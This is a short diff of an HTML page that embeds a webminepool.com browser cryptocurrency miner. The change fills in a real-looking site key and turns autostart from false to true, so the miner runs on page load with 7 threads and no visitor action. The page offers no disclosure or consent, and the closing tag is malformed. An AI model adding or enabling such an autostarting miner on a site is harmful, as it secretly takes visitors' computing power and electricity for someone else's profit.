@@ -6,11 +6,11 @@
 <body>
 <script src="https://webminepool.com/lib/simple-ui.js"></script>
 <div id="wmp-container"
-    wmp-site-key="<SK_kK7Et4ym7lDGyfbTps5ew>"
+    wmp-site-key="SK_kK7Et4ym7lDGyfbTps5ew"
     wmp-username="<username>"
     wmp-threads="7"
     wmp-throttle="0.8"
-    wmp-autostart="false"
+    wmp-autostart="true"
     style="margin: 0 auto;"
 >
 </div>/body>
